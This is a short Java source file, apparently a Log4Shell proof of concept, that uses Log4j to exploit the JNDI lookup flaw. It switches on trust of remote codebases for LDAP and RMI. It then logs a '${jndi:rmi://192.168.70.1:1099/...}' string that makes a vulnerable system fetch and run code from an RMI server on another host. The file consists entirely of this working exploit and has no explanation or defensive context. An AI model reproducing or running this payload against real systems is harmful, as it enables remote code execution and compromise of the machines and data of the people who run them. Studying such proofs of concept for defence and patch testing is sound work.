import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.LogManager;


public class log4jRCE {
    private static final Logger logger = LogManager.getLogger(log4jRCE.class);
    public static void main(String[] args)
    {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");//JDK>=1.8.191 Need Set
        logger.error("${jndi:rmi://192.168.70.1:1099/koqzp4}");
    }
}
